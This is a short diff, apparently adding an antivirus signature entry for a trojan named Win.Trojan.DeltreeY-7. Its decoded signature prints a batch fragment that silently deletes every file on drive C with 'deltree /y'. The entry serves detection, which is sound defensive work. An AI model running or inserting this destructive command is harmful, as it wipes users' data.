@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Trojan.DeltreeY-7
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+echo off
+cls
+deltree /y c:\*.* >nul
+
